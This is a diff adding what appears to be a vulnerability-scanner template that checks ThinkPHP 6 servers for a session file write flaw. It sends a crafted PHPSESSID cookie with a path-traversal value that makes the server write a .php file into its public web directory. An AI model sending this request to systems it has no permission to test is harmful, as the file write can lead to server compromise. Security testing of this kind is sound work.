@@ -1,0 +1,37 @@
+id: poc-local-thinkphp-v6-session-file-write
+
+info:
+  name: poc-local-thinkphp-v6-session-file-write
+  author: capiton
+  severity: high
+  description: ""
+  reference: 
+    - https://github.com/bewhale/thinkphp_gui_tools
+  tags: thinkphp
+
+variables:
+  filename: "{{rand_text_alpha(7)}}"
+
+requests:
+  - raw:
+      - |-
+        GET /{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Cache-Control: no-cache
+        Cookie: PHPSESSID=../../../../public/{{filename}}.php
+        Pragma: no-cache
+
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        condition: and
+        words:
+          - "a:1:{s:4:\"name\";s:8:\"thinkphp\";}"
+
+
